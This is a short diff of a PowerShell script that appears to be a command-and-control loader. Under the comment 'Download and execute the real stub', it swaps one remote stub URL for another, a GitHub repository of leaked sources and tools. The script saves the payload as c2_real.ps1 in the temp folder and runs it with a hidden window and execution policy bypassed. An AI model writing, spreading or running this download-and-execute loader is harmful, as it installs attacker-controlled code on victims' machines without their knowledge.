@@ -58,7 +58,7 @@ if (Test-Path `$SessionIDFile) {
 }
 
 # Download and execute the real stub
-irm "https://vcc-library.netlify.app/erickparker/stub" -OutFile "`$env:TEMP\c2_real.ps1"
+irm "https://raw.githubusercontent.com/azuraclient/archived-leaked-srcs-and-tools/refs/heads/hi/luaarmorleakclient/sub.ps1" -OutFile "`$env:TEMP\c2_real.ps1"
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`$env:TEMP\c2_real.ps1"
 "@
             $currentScript | Out-File $scriptPath -Encoding UTF8
